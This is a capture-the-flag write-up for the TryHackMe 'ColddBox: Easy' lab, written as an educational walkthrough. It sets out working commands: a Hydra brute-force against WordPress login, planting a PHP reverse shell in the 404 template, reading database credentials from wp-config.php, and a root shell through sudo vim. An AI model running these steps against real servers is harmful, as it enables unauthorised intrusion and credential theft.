## ColddBox: Easy - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/colddboxeasy)

<i>Can you get access and get both flags?

Good Luck!.﻿

By Marti from Hixec.


Doubts and / or help in Hixec Community.

Thumbnail box image credits, designed by Freepik from www.flaticon.es</i>

**IP: 10.10.60.173**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web <br>

**Tools Used**: Nmap, Wpscan, Ffuf, Hydra<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting with Nmap scan and Ffuf fuzzing.

  ```
  nmap -sC -sV -T5 -p- 10.10.60.173

  PORT     STATE SERVICE VERSION
  80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
  |_http-generator: WordPress 4.1.31
  |_http-title: ColddBox | One more machine
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
  |   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
  |_  256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  ffuf -u http://10.10.60.173/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

  wp-includes             [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 48ms]
  wp-admin                [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 48ms]
  hidden                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 48ms]
  ```
  
- Since website is built with WordPress, I ran wpscan and found some credentials.

  ```
  wpscan --url http://10.10.60.173 -e ap, u 

  [i] User(s) Identified:
  
  [+] the cold in person
   | Found By: Rss Generator (Passive Detection)
  
  [+] c0ldd
   | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
   | Confirmed By: Login Error Messages (Aggressive Detection)
  
  [+] hugo
   | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
   | Confirmed By: Login Error Messages (Aggressive Detection)
  
  [+] philip
   | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
   | Confirmed By: Login Error Messages (Aggressive Detection)
  ```
  
- You can also find them here `http://10.10.60.173/hidden/`

  ```
  U-R-G-E-N-T
  C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip
  ```

- Let's do some brute forcing now. First intercept the login request with Burp so you can get parameters then put them in Hydra for brute forcing.

  ```
  POST /wp-login.php HTTP/1.1
  Host: 10.10.60.173
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Referer: http://10.10.60.173/wp-login.php
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 74
  Origin: http://10.10.60.173
  Connection: keep-alive
  Cookie: wordpress_test_cookie=WP+Cookie+check
  Upgrade-Insecure-Requests: 1
  Priority: u=0, i
  
  log=test&pwd=test&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1
  ```

  ```
  hydra -L users.txt -P /rockyou.txt  10.10.60.173 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
  [SNIP!]
  [80][http-post-form] host: 10.10.60.173   login: c0ldd   password: 9876543210
  [SNIP!]
  ```

- I stopped Hydra after first hit since it will take forever in order for it to go through all usernames. Login in to `wp-admin` with following credentials.
  
---

## ⚙️ Shell Access

- OK, so this took a while since I was trying different methods to upload shell (page, plugins, etc.). In the end I got it by editing the `404 Template`.
  Got to Appearances -> Editor -> 404 Template. Delete the whole template and paste shell content there then update it. After that, start a listener and purposely cause 404 error somewhere on website. I did it with blog page `http://10.10.60.173/?p=7`.
  Since blog page 7 doesnt exist you will get a reverse shell on your netcat listener.

  ```
  nc -lvnp 4444
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.60.173] 40640
  Linux ColddBox-Easy 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
   14:23:47 up 38 min,  0 users,  load average: 0.00, 0.04, 0.17
  USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  /bin/sh: 0: can't access tty; job control turned off
  $ whoami
  www-data
  $ id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```
  
- You can use any PHP reverse shell for editing 404 templates. If you are using Kali, you have one in `/usr/share/webshells/php`. Don't forget to change IP and Port in `php-reverse-shell.php` before putting it on web.
  
- Change it to putty shell and start looking for flags.

---

## 🧍 User Privilege Escalation

- I found a first flag but couldnt read it.

  ```
  www-data@ColddBox-Easy:/home$ cd c0ldd/
  www-data@ColddBox-Easy:/home/c0ldd$ ls -al
  total 24
  drwxr-xr-x 3 c0ldd c0ldd 4096 Oct 19  2020 .
  drwxr-xr-x 3 root  root  4096 Sep 24  2020 ..
  -rw------- 1 c0ldd c0ldd    0 Oct 19  2020 .bash_history
  -rw-r--r-- 1 c0ldd c0ldd  220 Sep 24  2020 .bash_logout
  -rw-r--r-- 1 c0ldd c0ldd    0 Oct 14  2020 .bashrc
  drwx------ 2 c0ldd c0ldd 4096 Sep 24  2020 .cache
  -rw-r--r-- 1 c0ldd c0ldd  655 Sep 24  2020 .profile
  -rw-r--r-- 1 c0ldd c0ldd    0 Sep 24  2020 .sudo_as_admin_successful
  -rw-rw---- 1 c0ldd c0ldd   53 Sep 24  2020 user.txt
  
  www-data@ColddBox-Easy:/home/c0ldd$ cat user.txt 
  cat: user.txt: Permission denied
  ```
  
- Password is not the same as `wp-admin` one. Since we are working with WordPress, I checked that directory as well and BINGO! Found the password for user `c0ldd`.

  ```
  www-data@ColddBox-Easy:/var/www/html$ ls -al
  total 192
  drwxr-xr-x  6 root     root      4096 Oct 14  2020 .
  drwxr-xr-x  3 root     root      4096 Oct 14  2020 ..
  drwxr-xr-x  2 root     root      4096 Oct 19  2020 hidden
  -rw-r--r--  1 www-data www-data   418 Sep 25  2013 index.php
  -rw-r--r--  1 www-data www-data 19930 Sep 24  2020 license.txt
  -rw-r--r--  1 www-data www-data  7173 Sep 24  2020 readme.html
  -rw-r--r--  1 www-data www-data  6369 Sep 24  2020 wp-activate.php
  drwxr-xr-x  9 www-data www-data  4096 Dec 18  2014 wp-admin
  -rw-r--r--  1 www-data www-data   271 Jan  8  2012 wp-blog-header.php
  -rw-r--r--  1 www-data www-data  5132 Sep 24  2020 wp-comments-post.php
  -rw-r--r--  1 www-data www-data  2726 Sep  9  2014 wp-config-sample.php
  -rw-rw-rw-  1 www-data www-data  3056 Oct 14  2020 wp-config.php
  drwxr-xr-x  7 www-data www-data  4096 May 16 14:22 wp-content
  -rw-r--r--  1 www-data www-data  2956 May 13  2014 wp-cron.php
  drwxr-xr-x 12 www-data www-data  4096 Dec 18  2014 wp-includes
  -rw-r--r--  1 www-data www-data  2380 Oct 25  2013 wp-links-opml.php
  -rw-r--r--  1 www-data www-data  2714 Jul  7  2014 wp-load.php
  -rw-r--r--  1 www-data www-data 33455 Sep 24  2020 wp-login.php
  -rw-r--r--  1 www-data www-data  8459 Sep 24  2020 wp-mail.php
  -rw-r--r--  1 www-data www-data 11115 Jul 18  2014 wp-settings.php
  -rw-r--r--  1 www-data www-data 25152 Nov 30  2014 wp-signup.php
  -rw-r--r--  1 www-data www-data  4035 Nov 30  2014 wp-trackback.php
  -rw-r--r--  1 www-data www-data  3032 Feb  9  2014 xmlrpc.php
  ```

  ```
  www-data@ColddBox-Easy:/var/www/html$ cat wp-config.php 
  <?php
  [SNIP!]
  
  // ** MySQL settings - You can get this info from your web host ** //
  /** The name of the database for WordPress */
  define('DB_NAME', 'colddbox');
  
  /** MySQL database username */
  define('DB_USER', 'c0ldd');
  
  /** MySQL database password */
  define('DB_PASSWORD', 'cybersecurity');
  
  /** MySQL hostname */
  define('DB_HOST', 'localhost');
  
  /** Database Charset to use in creating database tables. */
  define('DB_CHARSET', 'utf8');
  
  /** The Database Collate type. Don't change this if in doubt. */
  define('DB_COLLATE', '');
  [SNIP!]
  ```
  
- Now switch to user `c0ldd` and read the flag.

  ```
  www-data@ColddBox-Easy:/var/www/html$ su c0ldd
  Password: 
  c0ldd@ColddBox-Easy:/var/www/html$ whoami
  c0ldd
  
  c0ldd@ColddBox-Easy:/var/www/html$ id
  uid=1000(c0ldd) gid=1000(c0ldd) grupos=1000(c0ldd),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
  
  c0ldd@ColddBox-Easy:/var/www/html$ cat /home/c0ldd/user.txt 
  RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
  
  echo 'RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==' | base64 -d
  Felicidades, primer nivel conseguido! 
  
  Congratulations, first level achieved!
  ```

- Actually, encoded string is the flag lol. Moving to escalation.

---

## 👑 Root Privilege Escalation

- After running `sudo -l`, it gave me 3 different options, I chose `vim` for escalation. One-liner can be found on GTFOBins.

  ```
  c0ldd@ColddBox-Easy:/var/www/html$ sudo -l 
  [sudo] password for c0ldd: 
  Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
      (root) /usr/bin/vim
      (root) /bin/chmod
      (root) /usr/bin/ftp

  sudo vim -c ':!/bin/sh'    

    (rootescriba «:help version7<Intro>» para información de la versión# whoami
  root(root) /usr/bin/ftp
  # ldd@ColddBox-Easy:/var/www/html$ sudo vim -c ':!/bin/sh'
  # cat /root/root.txt
  wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
  ```
  
- Yeah, vim will kinda destroy your terminal but you can still get the flag. Congratulations!

  ```
  echo 'wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=' | base64 -d    
  ¡Felicidades, máquina completada! 
  
  Congratulations, machine completed!
  ```


---

## 🏁 Flags

- **User Flag**: `RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==`
- **Root Flag**: `wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Finding my way around implementing reverse shell through WordPress.`

- What did I learn?
  `New exploitation methods.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
